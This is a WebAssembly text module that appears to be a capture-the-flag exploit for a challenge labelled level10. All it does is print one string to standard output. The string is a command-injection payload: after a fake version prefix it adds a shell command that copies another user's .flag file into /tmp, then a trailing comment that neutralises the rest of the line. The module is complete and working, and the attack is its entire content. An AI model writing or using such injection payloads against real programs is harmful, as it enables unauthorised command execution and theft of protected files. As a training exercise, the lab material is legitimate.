(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  (data (i32.const 64) "v1:x1f;cat /home/flag10/.flag > /tmp/level10_flag.txt;#:fc8c9815\n")
  (func (export "_start")
    i32.const 0
    i32.const 64
    i32.store
    i32.const 4
    i32.const 65
    i32.store
    i32.const 1
    i32.const 0
    i32.const 1
    i32.const 8
    call $fd_write
    drop
  )
)
